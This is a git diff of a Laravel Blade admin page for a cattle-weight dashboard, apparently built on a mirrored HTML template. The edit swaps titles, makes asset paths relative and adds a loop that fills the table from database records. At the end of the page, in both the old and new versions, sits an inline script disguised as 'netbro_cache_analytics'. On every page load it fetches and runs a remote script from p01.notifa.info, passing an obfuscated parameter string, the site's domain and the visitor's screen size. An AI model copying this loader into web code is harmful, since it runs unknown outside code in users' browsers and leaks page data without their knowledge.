@@ -9,7 +9,7 @@
     <meta content="Design_Gurus" name="author">
     <meta content="WOW Admin dashboard html template" name="description">
     <meta content="width=device-width, initial-scale=1" name="viewport">
-    <title>SAPI-I7</title>
+    <title>FCMS</title>
 
     {{--untuk Modal--}}
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
@@ -18,38 +18,38 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
     <!--favicon-->
-    <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
+    <link href="../assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
 
     <!--Preloader-CSS-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/preloader/preloader.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">
 
     <!--bootstrap-4-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/bootstrap.min.css">
 
     <!--Custom Scroll-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
     <!--Font Icons-->
-    <link rel="stylesheet" href="assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/dripicons/dripicons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/eightyshades/eightyshades.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/foundation/foundation-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/metrize/metrize.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/typicons/typicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/dripicons/dripicons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/eightyshades/eightyshades.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/foundation/foundation-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/metrize/metrize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/typicons/typicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
 
     <!--Date-range-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/date-range/daterangepicker.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/date-range/daterangepicker.css">
     <!--Drop-Zone-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/dropzone/dropzone.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/dropzone/dropzone.css">
     <!--Full Calendar-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
     <!--Normalize Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/normalize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/normalize.css">
     <!--Main Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/main.css">
-    <link rel="stylesheet" type="text/css" href="assetAdmin/gradient.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/main.css">
+    <link rel="stylesheet" type="text/css" href="../assetAdmin/gradient.css">
 </head>
 <body>
 
@@ -71,13 +71,13 @@
     <!--Navigation-->
     <nav id="navigation" class="navigation-sidebar bg-primary">
         <div class="navigation-header">
-            <a href="index.html"><span class="logo">SAPI BALURAN</span></a>
+            <a href="index.html"><span class="logo">ADMIN INTI</span></a>
             <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
         </div>
 
         <!--Navigation Profile area-->
         <div class="navigation-profile">
-            <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+            <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
             <h4 class="name">Admin Inti</h4>
             <span class="designation">SAPI</span>
 
@@ -86,7 +86,7 @@
             <!--logged user hover menu-->
             <div class="logged-user-menu bg-white">
                 <div class="avatar-info">
-                    <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+                    <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
                     <h4 class="name">Meera</h4>
                     <span class="designation">UI/UX EXPERT</span>
                 </div>
@@ -121,7 +121,7 @@
         </div>
 
         <!--Navigation Menu Links-->
-        @include('inti.include_inti')
+        @include('inti.includeEdit')
     </nav>
 
     <!--Page Container-->
@@ -177,165 +177,142 @@
                                             </tr>
                                         </thead>
                                         <tbody>
+                                            <?php
+                                            $no=0;
+                                            ?>
+                                            @foreach($detail_pengajuan as $value)
                                             <tr>
-                                                <td >1</td>
-                                                <td >37 Kg</td>
-                                                <td >45 Kg</td>
-                                                <td>Lokal</td>
-                                                <td>Betina</td>
+                                                <?php
+                                                $no++;
+                                                $jk="";
+                                                if ($value->jenis_kelamin=="j") {
+                                                    $jk="Jantan";
+                                                }else{
+                                                    $jk="Betina";
+                                                }
+                                                ?>
+                                                <td>{{$no}}</td>
+                                                <td>{{$value->berat_awal}}</td>
+                                                <td>{{$value->berat_saat_ini}}</td>
+                                                <td>{{$value->jenis_sapi}}</td>
+                                                <td>{{$jk}}</td>
                                                 <td>
-                                                    <a href="edit_detail_sapi" class="btn btn-danger">Hapus</a>
+                                                    <a href="../../hapus_detailPengajuanPeternak/{{$value->id_sapi}}" class="btn btn-danger">Hapus</a>
                                                 </td>
                                                 <td>
-                                                    <a href="edit_detail_sapi" class="btn btn-warning">Edit</a>
-
-                                                </td>
-                                                <td>
-                                                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#updateModal">Berat saat ini</button>
-
-                                                </td>
-                                            </tr>
-
-                                            <tr>
-                                                <td>2</td>
-                                                <td>34 Kg</td>
-                                                <td>48 Kg</td>
-                                                <td>Lokal</td>
-                                                <td>Betina</td>
-                                                <td>
-                                                    <a href="tambah_detail_sapi" class="btn btn-danger">Hapus</a>
-                                                </td>
-                                                <td>
-                                                    <a href="edit_detail_sapi" class="btn btn-warning">Edit</a>
+                                                    <a href="../edit_detailPengajuanPeternak/{{$value->id_sapi}}" class="btn btn-warning">Edit</a>
 
                                                 </td>
                                                 <td>
-                                                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#updateModal">Berat saat ini</button>
+                                                     <form method="GET" action="/beratSaatIni/{{$value->id_sapi}}" enctype="multipart/form-data">
+                                                        {{csrf_field()}}
+                                                        <button type="submit" class="btn btn-primary" hidden="" >Berat saat ini</button>
+                                                    </form>
+                                                    </td>
+                                                </tr>
+                                                @endforeach
 
-                                                </td>
-                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
 
-                                            <tr>
-                                                <td>3</td>
-                                                <td>34 Kg</td>
-                                                <td>48 Kg</td>
-                                                <td>Bali</td>
-                                                <td>Jantan</td>
-                                                <td>
-                                                    <a href="tambah_detail_sapi" class="btn btn-danger">Hapus</a>
-                                                </td>
-                                                <td>
-                                                    <a href="edit_detail_sapi" class="btn btn-warning">Edit</a>
-
-                                                </td>
-                                                <td>
-                                                    <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#updateModal">Berat saat ini</button>
-
-                                                </td>
-                                            </tr>
-
-
-                                        </tbody>
-                                    </table>
                                 </div>
+
 
                             </div>
-
-
                         </div>
                     </div>
-                </div>
 
-            </section>
-
-
-            <!-- The Modal -->
-            <div class="modal fade" id="updateModal">
-                <div class="modal-dialog modal-dialog-centered">
-                    <div class="modal-content">
-
-                        <!-- Modal Header -->
-                        <div class="modal-header bg-primary">
-                            <h4 class="modal-title" style="color:white;">UPDATE BERAT SAPI</h4>
-                            <button type="button" class="close" data-dismiss="modal">&times;</button>
-                        </div>
-
-                        <!-- Modal body -->
-                        <div class="modal-body">
+                </section>
 
 
-                            <form action="#">
+                <!-- The Modal -->
+                <div class="modal fade" id="updateModal">
+                    <div class="modal-dialog modal-dialog-centered">
+                        <div class="modal-content">
 
-                                <div class="form-group">
-                                    <label>Berat Awal</label>
-                                    <input class="form-control" value="40 Kg" type="text" disabled="true">
-                                </div>
-                                <div class="form-group">
-                                    <label>Berat Saat Ini</label>
-                                    <input class="form-control" placeholder="Masukkan dalam satuan Kg" type="text">
-                                </div>
+                            <!-- Modal Header -->
+                            <div class="modal-header bg-primary">
+                                <h4 class="modal-title" style="color:white;">UPDATE BERAT SAPI</h4>
+                                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                            </div>
+
+                            <!-- Modal body -->
+                            <div class="modal-body">
 
 
-                                <!-- Modal footer -->
-                                <div class="modal-footer">
+                                <form action="#">
 
-                                    <button class="btn btn-success" type="submit">Simpan</button>
+                                    <div class="form-group">
+                                        <label>Berat Awal</label>
+                                        <input class="form-control" value="40 Kg" type="text" disabled="true">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Berat Saat Ini</label>
+                                        <input class="form-control" placeholder="Masukkan dalam satuan Kg" type="text">
+                                    </div>
 
-                                    <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
-                                </div>
-                            </form>
+
+                                    <!-- Modal footer -->
+                                    <div class="modal-footer">
+
+                                        <button class="btn btn-success" type="submit">Simpan</button>
+
+                                        <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
+                                    </div>
+                                </form>
+                            </div>
                         </div>
                     </div>
-                </div>
 
 
 
 
 
-                <!--Jquery-->
-                <script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
-                <!--Bootstrap Js-->
-                <script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
-                <script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
-                <!--Modernizr Js-->
-                <script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>
+                    <!--Jquery-->
+                    <script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
+                    <!--Bootstrap Js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/js/popper.min.js"></script>
+                    <script type="text/javascript" src="../assetAdmin/assets/js/bootstrap.min.js"></script>
+                    <!--Modernizr Js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/js/modernizr.custom.js"></script>
 
-                <!--Morphin Search JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
-                <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
-                <!--Morphin Search JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
-                <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
+                    <!--Morphin Search JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/classie.js"></script>
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
+                    <!--Morphin Search JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
 
-                <!--Chart js-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>
+                    <!--Chart js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/charts/Chart.min.js"></script>
 
-                <!--Sparkline Chart Js-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
-                <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
+                    <!--Sparkline Chart Js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
 
-                <!--Custom Scroll-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
-                <!--Sortable Js-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
-                <!--DropZone Js-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
-                <!--Date Range JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
-                <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
-                <!--CK Editor JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
-                <!--Data-Table JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
-                <!--Editable JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
-                <!--Full Calendar JS-->
-                <script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
+                    <!--Custom Scroll-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
+                    <!--Sortable Js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
+                    <!--DropZone Js-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
+                    <!--Date Range JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/moment.min.js"></script>
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
+                    <!--CK Editor JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
+                    <!--Data-Table JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
+                    <!--Editable JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/editable/editable.js"></script>
+                    <!--Full Calendar JS-->
+                    <script type="text/javascript" src="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
 
-                <!--- Main JS -->
-                <script src="assetAdmin/assets/js/main.js"></script>
+                    <!--- Main JS -->
+                    <script src="../assetAdmin/assets/js/main.js"></script>
 
-                <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+                    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
-                <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
-                </html>
+                    <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
+                    </html>
